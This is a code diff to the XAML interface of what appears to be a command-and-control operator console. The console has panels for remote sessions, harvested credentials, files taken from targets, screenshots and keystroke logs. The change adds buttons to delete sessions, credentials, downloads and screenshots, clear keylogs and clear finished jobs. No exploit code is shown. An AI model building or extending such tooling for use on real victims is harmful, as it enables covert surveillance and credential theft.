@@ -238,6 +238,7 @@
                                 <MenuItem Header="催心跳 checkin" Click="CtxCheckin_Click"/>
                                 <Separator/>
                                 <MenuItem Header="结束会话" Click="CtxExit_Click"/>
+                                <MenuItem Header="删除会话(从列表移除)" Click="CtxRemove_Click"/>
                                 <Separator/>
                                 <MenuItem Header="复制会话信息" Click="CtxCopy_Click"/>
                             </ContextMenu>
@@ -412,6 +413,8 @@
                                    Margin="12,3,0,0"/>
                         <Button Content="复制密码" Style="{StaticResource Mini}" Margin="18,0,0,0"
                                 Click="CopyPass_Click"/>
+                        <Button Content="删除选中" Style="{StaticResource Mini}"
+                                Click="DeleteCred_Click"/>
                         <Button Content="导出 CSV" Style="{StaticResource Mini}"
                                 Click="ExportCsv_Click"/>
                     </StackPanel>
@@ -447,6 +450,9 @@
                                 ToolTip="GET /api/download/file?id=&lt;记录号&gt; — 文本直接显示; 二进制如实说明并给大小与前 256 字节十六进制"/>
                         <Button Content="刷新" Style="{StaticResource Mini}"
                                 Click="RefreshDownloads_Click"/>
+                        <Button Content="删除选中" Style="{StaticResource Mini}"
+                                Click="DeleteDownload_Click"
+                                ToolTip="POST /api/downloads/delete — 同时删除服务端落盘文件"/>
                     </StackPanel>
 
                     <DataGrid x:Name="GridDownloads" Grid.Row="1"
@@ -483,6 +489,9 @@
                                        Margin="12,3,0,0"/>
                             <Button Content="刷新" Style="{StaticResource Mini}" Margin="14,0,0,0"
                                     Click="RefreshShots_Click"/>
+                            <Button Content="删除选中" Style="{StaticResource Mini}"
+                                    Click="DeleteShot_Click"
+                                    ToolTip="POST /api/screenshots/delete — 同时删除服务端落盘文件"/>
                         </StackPanel>
 
                         <ListBox x:Name="ListShots" Grid.Row="1"
@@ -553,6 +562,9 @@
                                    Margin="12,3,0,0"/>
                         <TextBlock Text="来源: GET /api/state.keylogs（服务端整条入库, 双击行复制内容）"
                                    Style="{StaticResource Sub}" Margin="14,3,0,0"/>
+                        <Button Content="清空" Style="{StaticResource Mini}" Margin="14,0,0,0"
+                                Click="ClearKeylogs_Click"
+                                ToolTip="POST /api/keylogs/clear — 清空全部键盘记录"/>
                     </StackPanel>
 
                     <DataGrid x:Name="GridKeylogs" Grid.Row="1" MouseDoubleClick="GridKeylogs_MouseDoubleClick">
@@ -1702,6 +1714,7 @@
                         <DataGrid.ContextMenu>
                             <ContextMenu>
                                 <MenuItem Header="终止该作业 (jobkill)" Click="JobCtxKill_Click"/>
+                                <MenuItem Header="清空已结束作业" Click="JobCtxClear_Click"/>
                                 <MenuItem Header="复制作业信息" Click="JobCtxCopyInfo_Click"/>
                                 <Separator/>
                                 <MenuItem Header="只看该会话" Click="JobCtxOnlySid_Click"/>
